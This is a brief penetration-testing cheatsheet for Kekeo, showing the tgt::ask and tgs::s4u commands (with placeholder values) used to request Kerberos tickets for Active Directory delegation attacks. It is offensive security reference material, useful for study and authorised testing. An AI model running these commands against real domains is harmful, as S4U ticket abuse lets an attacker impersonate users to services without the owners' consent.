# Kekeo Cheatsheet
[Kekeo](https://github.com/gentilkiwi/kekeo) is tool for [[Attacking-Kerberos]] and with [[Mimikatz-Cheatsheet]] performing [[AD-Kerberos-Delegation-Exploitation]]. For details about Kerberos Authentication see [[Active-Directory-Kerberos-Authentication-Defined]]


Generate TGT tickets 
```shell
# kekeo.exe
tgt::ask /user:<user> /domain:<domain> /password:<password>
# Successful output will have:
> Ticket in file 'tgt_filename'
#
tgs::s4u /tgt:'tgt_filename' /user:<current_username_not_svc> /service:<service>
# Successful output will have:
> Ticket in file 'TGS_...'
```


## References
[Github Repo](https://github.com/gentilkiwi/kekeo)